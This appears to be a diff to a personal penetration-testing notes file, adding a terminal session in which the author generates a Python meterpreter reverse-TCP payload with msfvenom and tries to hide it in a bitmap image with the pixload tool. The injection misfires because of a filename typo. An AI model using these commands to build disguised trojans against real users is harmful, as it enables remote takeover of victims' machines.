@@ -4366,6 +4366,43 @@ or on machines provided by hackthebox. They are designed to be fun to hack while
 
     ⭐  ~/test-trojan  ok  at 13:01:44 >
 
+    https://github.com/chinarulezzz/pixload
+    
+    > sudo msfvenom -p python/meterpreter_reverse_tcp LHOST=192.168.85.139 LPORT=1234 -f RAW > trojan.py
+    [-] No platform was selected, choosing Msf::Module::Platform::Python from the payload
+    [-] No arch selected, selecting arch: python from the payload
+    No encoder specified, outputting raw payload
+    Payload size: 116953 bytes
+
+    > /usr/local/bin/pixload-bmp --payload "$(cat troyan.py)" troyan.png
+    cat: troyan.py: No such file or directory
+    ......... BMP Payload Creator/Injector ........
+    ...............................................
+    ... https://github.com/chinarulezzz/pixload ...
+    ...............................................
+
+    [>] Generating output file
+    [✔] File saved to: troyan.png
+
+    [>] Injecting payload into troyan.png
+    [✔] Payload was injected successfully
+
+    troyan.png: PC bitmap, OS/2 1.x format, 1 x 1 x 24, cbSize 10799, bits offset 26
+
+    00000000  42 4d 2f 2a 00 00 00 00  00 00 1a 00 00 00 0c 00  |BM/*............|
+    00000010  00 00 01 00 01 00 01 00  18 00 00 00 ff 00 2a 2f  |..............*/|
+    00000020  3d 31 3b 3b                                       |=1;;|
+    00000024
+
+    > ls
+    config.mk   Makefile       pixload-bmp.1.pod  pixload-gif.1      pixload-jpg        pixload-jpg.in  pixload-png.1.pod  pixload-webp.1      README.md
+    Dockerfile  pixload-bmp    pixload-bmp.in     pixload-gif.1.pod  pixload-jpg.1      pixload-png     pixload-png.in     pixload-webp.1.pod  trojan.py
+    LICENSE     pixload-bmp.1  pixload-gif        pixload-gif.in     pixload-jpg.1.pod  pixload-png.1   pixload-webp       pixload-webp.in     troyan.png
+    > pwd
+    /home/kali/pixload
+
+     ⭐  ~/pixload  ok  at 16:29:27 >
+
     3) pesidious -> weird, now i cannot run it...  https://github.com/CyberForce/Pesidious/issues/8
 
     https://kalilinuxtutorials.com/pesidious/
